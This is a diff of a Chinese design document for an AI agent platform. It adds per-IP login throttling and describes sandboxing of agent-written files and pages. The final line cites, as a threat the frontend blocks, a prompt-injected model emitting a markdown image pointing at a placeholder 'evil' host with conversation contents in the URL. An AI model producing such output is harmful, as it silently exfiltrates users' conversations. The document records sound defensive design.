@@ -590,7 +590,7 @@ agent 在任何一次运行里都可以在自己的资源目录里建 `skills/<�
 
 其他边界：
 
-- Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。签名 key 由密钥与密码摘要一起派生：改密码（改配置后重启）即吊销所有已签发的 cookie，没有服务端会话表；登出只删浏览器里的 cookie。登录接口未做频率限制，部署在公网时应在反向代理层限流。
+- Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。签名 key 由密钥与密码摘要一起派生：改密码（改配置后重启）即吊销所有已签发的 cookie，没有服务端会话表；登出只删浏览器里的 cookie。登录失败按来源 IP 退避（`api/auth.py` 的 `LoginThrottle`，#540，只在内存、重启清零）：同一 IP 连续输错 5 次后，每再错一次要等 30 秒起翻倍、最长 15 分钟才能再试，等待期内一律 429 + `Retry-After`（不校验密码，连对的也拒）；登录成功或最后一次失败过了 1 小时清零。来源 IP 是 uvicorn `proxy_headers` 给出的 `request.client.host`：只采信受信代理（默认 127.0.0.1，即本机 userspace tailscaled 转进来的连接）带的 `X-Forwarded-For`，公网入口（kaojiang 的 Traefik）丢掉客户端自带的这个头、换成真实 IP。
 - 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。agent 页「文件」读工作目录的文件（`GET /api/agents/{id}/workspace/file`，#308）同样处理；路径解析符号链接后必须在工作目录内，只防界面误走出去；界面预览用 fetch 读文字（Markdown 与代码高亮在前端做），HTML/SVG 只显示源码。
 - agent 自定义页面（#355，`workspace/sites.py`、`api/sites.py`）：agent 在工作目录写 `site/<页面名>/index.html`（标题取 `<title>`），界面首页导航「页面」列出（`GET /api/pages`，按 agent 分组的卡片，组内与组间都按最近更新倒序，见 `web/src/pageGroups.ts`）、iframe 打开。页面要能执行脚本，又不能与界面同源：响应带 `Content-Security-Policy: sandbox allow-scripts …`（不含 allow-same-origin），页面是不透明的源，读不到 cookie、调不了 `/api`。沙箱里的请求不带 cookie，页面与同目录文件凭签名 URL 访问（`/sites/<agent>/<页面>/<签名>/<文件>`，签名与 cookie 同一把 key，改密码即失效；只有登录后的列表接口给出）；页面用相对路径读同目录数据（跨源，响应带 `Access-Control-Allow-Origin: *`），`Referrer-Policy: no-referrer` 免得加载外部资源时带出签名 URL。平台不运行 agent 的服务：实时数据由触发器或常驻脚本写文件、页面轮询。
 - 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
